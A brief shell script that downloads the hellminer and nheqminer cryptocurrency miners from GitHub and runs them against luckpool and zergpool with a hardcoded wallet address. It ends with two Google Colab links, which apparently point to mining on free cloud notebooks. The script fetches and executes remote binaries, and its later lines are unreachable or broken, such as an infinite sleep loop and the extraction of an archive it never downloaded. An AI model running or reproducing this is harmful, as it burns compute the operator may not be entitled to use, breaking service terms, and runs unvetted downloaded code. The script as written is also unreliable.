#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar -xvf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RSXFkbsHyxUqEDCW4pzkjCndvesK7qEXng.tuyul -p x --cpu 2

./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RSXFkbsHyxUqEDCW4pzkjCndvesK7qEXng.tuyul -p x --cpu 1
while [ 1 ]; do
sleep 3
done
sleep 999

wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
cd nheqminer
./nheqminer -v -l ap.luckpool.net:3956 -u RSXFkbsHyxUqEDCW4pzkjCndvesK7qEXng.tuyul3 -p x -t 10

./nheqminer -a verushash -o stratum+tcp://verushash.eu.mine.zergpool.com:3300 -u RSXFkbsHyxUqEDCW4pzkjCndvesK7qEXng -p  c=DOGE,mc=VRSC,ID=z-1

https://colab.research.google.com/drive/1TrKh_s2asG0n64IxW7_UANnkctTKREoD#scrollTo=3net2zi6yqsD

https://colab.research.google.com/drive/1VKAOqvzqbf5lhPYI_Gecp0OtaGF62j8E
